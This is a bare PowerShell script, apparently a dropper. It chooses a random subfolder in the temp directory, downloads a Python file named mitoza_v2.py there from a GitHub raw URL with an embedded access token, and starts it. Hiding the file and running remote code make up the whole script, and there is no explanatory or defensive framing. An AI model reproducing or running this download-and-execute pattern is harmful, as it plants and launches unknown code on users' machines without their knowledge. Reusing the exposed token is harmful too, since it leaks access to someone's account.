$pth=(Get-ChildItem -Path $env:tmp -Directory -Name)
$irec=($pth[(Get-Random -Minimum 1 -Maximum ($pth | Measure-Object -Line).Lines)])
$direc = "$env:tmp\$irec"
iwr https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py?token=GHSAT0AAAAAAC46SNMPZUYQ3LNM4MDZHJAUZ5CPWKA -outfile "$direc\mitoza.py"
start "$direc\mitoza.py"